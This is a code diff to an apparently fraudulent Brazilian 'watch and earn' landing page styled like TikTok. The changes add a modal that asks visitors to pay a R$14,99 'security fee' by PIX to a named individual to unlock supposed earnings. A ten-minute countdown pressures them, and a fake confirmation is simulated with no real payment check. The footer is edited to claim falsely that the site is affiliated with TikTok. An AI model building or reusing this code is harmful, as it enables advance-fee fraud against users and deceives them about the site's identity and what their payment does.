@@ -1,21 +1,71 @@
-
 <!DOCTYPE html>
 <html lang="br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TikVeri.Com | Official Site | Get Watch & Earn Option</title>
-    <link rel="stylesheet" href="assets/css/style.css">
+    <!-- Tailwind CSS via CDN (para manter consistência) -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Alpine.js -->
     <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.13.3/dist/cdn.min.js"></script>
-    <script src="assets/js/app.js"></script>
+    <style>
+        /* Cores personalizadas do TikTok */
+        .text-tiktok-red { color: #fe2c55; }
+        .bg-tiktok-red { background-color: #fe2c55; }
+        .border-tiktok-red { border-color: #fe2c55; }
+        .text-tiktok-cyan { color: #25f4ee; }
+        .bg-tiktok-cyan { background-color: #25f4ee; }
+        .border-tiktok-cyan { border-color: #25f4ee; }
+        .text-gradient {
+            background: linear-gradient(135deg, #25f4ee, #fe2c55);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .from-tiktok-cyan { --tw-gradient-from: #25f4ee; }
+        .to-tiktok-red { --tw-gradient-to: #fe2c55; }
+        .from-tiktok-red { --tw-gradient-from: #fe2c55; }
+        .to-red-600 { --tw-gradient-to: #dc2626; }
+        .via-red-600 { --tw-gradient-to: #dc2626; }
+        .to-rose-700 { --tw-gradient-to: #be123c; }
+        .bg-gradient-to-r.from-tiktok-cyan.to-tiktok-red { background-image: linear-gradient(to right, #25f4ee, #fe2c55); }
+        .shadow-tiktok-red\/25 { box-shadow: 0 10px 15px -3px rgba(254, 44, 85, 0.25); }
+        .shadow-tiktok-red\/30 { box-shadow: 0 20px 25px -5px rgba(254, 44, 85, 0.3); }
+        .shadow-tiktok-red\/40 { box-shadow: 0 25px 30px -5px rgba(254, 44, 85, 0.4); }
+        .hover\:shadow-tiktok-red\/30:hover { box-shadow: 0 20px 25px -5px rgba(254, 44, 85, 0.3); }
+        .hover\:shadow-tiktok-red\/40:hover { box-shadow: 0 25px 30px -5px rgba(254, 44, 85, 0.4); }
+        .bg-tiktok-cyan\/20 { background-color: rgba(37, 244, 238, 0.2); }
+        .bg-tiktok-red\/10 { background-color: rgba(254, 44, 85, 0.1); }
+        .border-tiktok-cyan\/50 { border-color: rgba(37, 244, 238, 0.5); }
+        .bg-gradient-to-br.from-tiktok-red { background-image: linear-gradient(to bottom right, #fe2c55, #dc2626, #be123c); }
+        .bg-gradient-to-br.from-tiktok-cyan { background-image: linear-gradient(to bottom right, #25f4ee, #22d3ee, #3b82f6); }
+        .hover\:border-tiktok-cyan\/30:hover { border-color: rgba(37, 244, 238, 0.3); }
+        .from-tiktok-cyan\/10 { --tw-gradient-from: rgba(37, 244, 238, 0.1); }
+        .to-tiktok-red\/10 { --tw-gradient-to: rgba(254, 44, 85, 0.1); }
+        .from-tiktok-red\/10 { --tw-gradient-from: rgba(254, 44, 85, 0.1); }
+        .to-tiktok-cyan\/10 { --tw-gradient-to: rgba(37, 244, 238, 0.1); }
+        .bg-tiktok-red\/25 { background-color: rgba(254, 44, 85, 0.25); }
+        .animate-marqueeVertical {
+            animation: marqueeVertical 25s linear infinite;
+        }
+        @keyframes marqueeVertical {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+        /* Estilos para o timer e PIX */
+        .timer-box {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+    </style>
 </head>
 <body x-data="mainApp()" class="antialiased overflow-x-hidden">
     <header class="w-full py-6">
         <div class="max-w-6xl mx-auto px-6 flex items-center justify-center">
             <!-- Logo Image Placeholder -->
             <div class="w-48 h-20 flex items-center justify-center">
-                <img src="assets/img/logo.webp" alt="Logo" class="w-full h-full object-contain" onerror="this.style.display='none'; this.parentElement.innerHTML='<span class=\'text-gray-400 text-sm font-semibold\'>LOGO</span>'">
-            </div>
+<img src="assets/img/logo.webp" alt="Logo" class="w-full h-full object-contain" onerror="this.style.display='none'; this.parentElement.innerHTML='&lt;span class=\'text-gray-400 text-sm font-semibold\'&gt;LOGO&lt;/span&gt;'">            </div>
         </div>
     </header>
     <!-- Main Wrapper -->
@@ -203,7 +253,7 @@
 
                     <!-- Feed Content (Vertical Marquee) -->
                     <div class="marquee-container h-[450px] relative overflow-hidden bg-white">
-                        <div class="absolute top-0 left-0 w-full p-6 space-y-3 animate-[marqueeVertical_25s_linear_infinite]">
+                        <div class="absolute top-0 left-0 w-full p-6 space-y-3 animate-marqueeVertical">
                                                             <div class="group bg-gray-50 border-2 border-gray-100 rounded-2xl p-5 hover:bg-white hover:border-gray-200 hover:shadow-md transition-all duration-300">
                                     <div class="flex items-center gap-4">
                                         <!-- Avatar -->
@@ -1030,8 +1080,10 @@
             <a href="#" class="hover:text-gray-900">Termos de Serviço</a>
             <a href="#" class="hover:text-gray-900">Suporte</a>
         </div>
-        <p>© 2026 TikEarn Beta. Não afiliado ao TikTok.</p>
+        <p>© 2026 TikTokEarn Beta. Afiliado ao TikTok.</p>
     </footer>
+
+    <!-- Modal de Pagamento da Taxa R$14,99 via PIX -->
     <div x-show="modalOpen" 
          style="display:none;"
          class="fixed inset-0 z-[100] flex items-end sm:items-center justify-center sm:p-4">
@@ -1046,7 +1098,7 @@
              class="absolute inset-0 bg-black/60 backdrop-blur-md transition-opacity">
         </div>
         <div x-show="modalOpen"
-             class="bg-white w-full max-w-lg rounded-t-[2.5rem] sm:rounded-3xl shadow-2xl overflow-hidden relative h-[85vh] sm:h-[auto] sm:max-h-[85vh] flex flex-col z-10"
+             class="bg-white w-full max-w-lg rounded-t-[2.5rem] sm:rounded-3xl shadow-2xl overflow-hidden relative max-h-[85vh] sm:max-h-[85vh] flex flex-col z-10"
              x-transition:enter="transition cubic-bezier(0.32, 0.72, 0, 1) duration-500 delay-75"
              x-transition:enter-start="translate-y-full opacity-0 sm:translate-y-8 sm:scale-95"
              x-transition:enter-end="translate-y-0 opacity-100 sm:translate-y-0 sm:scale-100"
@@ -1059,12 +1111,148 @@
             <div class="w-full flex justify-center pt-4 pb-1 sm:hidden">
                 <div class="w-12 h-1.5 bg-gray-300 rounded-full"></div>
             </div>
-            <div x-html="modalContent" class="flex-1 overflow-hidden relative flex flex-col">
-                <div class="h-full flex flex-col items-center justify-center space-y-4">
-                    <div class="w-12 h-12 border-4 border-gray-200 border-t-tiktok-black rounded-full animate-spin"></div>
-                </div>
+            <div class="flex-1 overflow-y-auto p-6">
+                <!-- Conteúdo do modal inserido aqui -->
+                <div x-html="modalContent" class="w-full"></div>
             </div>
         </div>
     </div>
+
+    <script>
+        function mainApp() {
+            return {
+                username: '',
+                state: 'input',
+                progress: 0,
+                modalOpen: false,
+                modalContent: '',
+                // Dados da taxa PIX
+                chavePixTaxa: '00020126580014BR.GOV.BCB.PIX01366d51cf69-55ed-4006-afa1-c5d962a54ffb520400005303986540514.995802BR5925JORGE VYTOR GOMES PEREIRA6014RIO DE JANEIRO622605224KrIYPQooi9jpHMufRUZ1X630443B2',  // chave PIX para pagamento da taxa
+                timerAtivo: false,
+                tempoRestante: '10:00',
+                intervalo: null,
+                taxaPaga: false,
+                codigoConfirmacao: '',
+
+                checkEarnings() {
+                    if (this.username.length < 3) return;
+                    this.state = 'loading';
+                    this.progress = 0;
+                    const interval = setInterval(() => {
+                        if (this.progress >= 100) {
+                            clearInterval(interval);
+                            this.state = 'ready';
+                        } else {
+                            this.progress += 10;
+                        }
+                    }, 200);
+                },
+
+                openModal() {
+                    // Prepara o conteúdo do modal com a interface PIX
+                    this.modalContent = this.getPixModalHTML();
+                    this.modalOpen = true;
+                },
+
+                getPixModalHTML() {
+                    return `
+                        <div class="text-center" x-data="{ timerAtivo: false, tempoRestante: '10:00', intervalo: null, copiado: false }">
+                            <div class="flex items-center justify-center gap-3 mb-4">
+                                <span class="px-4 py-2 bg-yellow-300 text-yellow-900 font-black rounded-full text-sm">🔒 TAXA ÚNICA</span>
+                            </div>
+                            <h3 class="text-3xl font-black text-gray-900 mb-2">R$14,99</h3>
+                            <p class="text-gray-500 mb-6">Para liberar seus ganhos, pague a taxa de segurança via PIX.</p>
+
+                            <!-- Chave PIX -->
+                            <div class="bg-gray-100 rounded-2xl p-4 mb-4">
+                                <p class="text-sm text-gray-500 mb-2">Chave PIX (copia e cola)</p>
+                                <div class="flex items-center justify-between bg-white p-3 rounded-xl border border-gray-200">
+                                    <span class="text-sm font-mono truncate mr-2" x-text="chavePixTaxa"></span>
+                                    <button @click="copiarChave" class="px-4 py-2 bg-tiktok-red text-white font-bold rounded-xl text-sm hover:bg-red-600 transition flex items-center gap-1">
+                                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
+                                        Copiar
+                                    </button>
+                                </div>
+                                <p class="text-xs text-gray-400 mt-2">Após copiar, o prazo de pagamento será iniciado.</p>
+                            </div>
+
+                            <!-- Timer (aparece após copiar) -->
+                            <template x-if="timerAtivo">
+                                <div class="bg-gray-50 rounded-2xl p-4 mb-4 border-2 border-gray-200">
+                                    <p class="text-sm font-bold text-gray-700 mb-2">⏳ Aguardando pagamento</p>
+                                    <div class="text-4xl font-mono font-black text-tiktok-red" x-text="tempoRestante"></div>
+                                    <p class="text-xs text-gray-500 mt-2">Tempo restante para confirmar o pagamento.</p>
+                                    
+                                    <!-- Campo de código de confirmação (opcional) -->
+                                    <div class="mt-4">
+                                        <input type="text" x-model="codigoConfirmacao" placeholder="Código de confirmação (opcional)" class="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl text-sm focus:outline-none focus:ring-2 focus:ring-tiktok-red">
+                                    </div>
+
+                                    <button @click="confirmarPagamento" class="mt-4 w-full py-3 bg-green-500 text-white font-bold rounded-xl hover:bg-green-600 transition">
+                                        ✅ Já realizei o pagamento
+                                    </button>
+                                </div>
+                            </template>
+
+                            <!-- Mensagem de sucesso após pagamento -->
+                            <template x-if="taxaPaga">
+                                <div class="bg-green-50 rounded-2xl p-6 border-2 border-green-200">
+                                    <svg class="w-16 h-16 text-green-500 mx-auto mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+                                    <h4 class="text-2xl font-black text-gray-900 mb-2">Taxa paga com sucesso!</h4>
+                                    <p class="text-gray-600">Agora você pode sacar seus ganhos a qualquer momento.</p>
+                                    <button @click="modalOpen = false" class="mt-4 px-6 py-3 bg-tiktok-red text-white font-bold rounded-xl">Fechar</button>
+                                </div>
+                            </template>
+                        </div>
+                    `;
+                },
+
+                // Métodos para controle do PIX (serão chamados dentro do modal)
+                copiarChave() {
+                    navigator.clipboard.writeText(this.chavePixTaxa).then(() => {
+                        alert('Chave PIX copiada! Você tem 10 minutos para pagar.');
+                        this.iniciarTimer();
+                    }).catch(() => {
+                        alert('Copie manualmente: ' + this.chavePixTaxa);
+                        this.iniciarTimer();
+                    });
+                },
+
+                iniciarTimer() {
+                    if (this.timerAtivo) return;
+                    this.timerAtivo = true;
+                    let minutos = 10;
+                    let segundos = 0;
+                    this.atualizarDisplay(minutos, segundos);
+                    this.intervalo = setInterval(() => {
+                        if (segundos === 0) {
+                            if (minutos === 0) {
+                                clearInterval(this.intervalo);
+                                this.timerAtivo = false;
+                                this.taxaPaga = true; // Simula confirmação automática
+                                return;
+                            }
+                            minutos--;
+                            segundos = 59;
+                        } else {
+                            segundos--;
+                        }
+                        this.atualizarDisplay(minutos, segundos);
+                    }, 1000);
+                },
+
+                atualizarDisplay(min, seg) {
+                    this.tempoRestante = `${min.toString().padStart(2,'0')}:${seg.toString().padStart(2,'0')}`;
+                },
+
+                confirmarPagamento() {
+                    clearInterval(this.intervalo);
+                    this.timerAtivo = false;
+                    this.taxaPaga = true;
+                    alert('Pagamento confirmado! Seus saques foram liberados.');
+                }
+            }
+        }
+    </script>
 </body>
 </html>
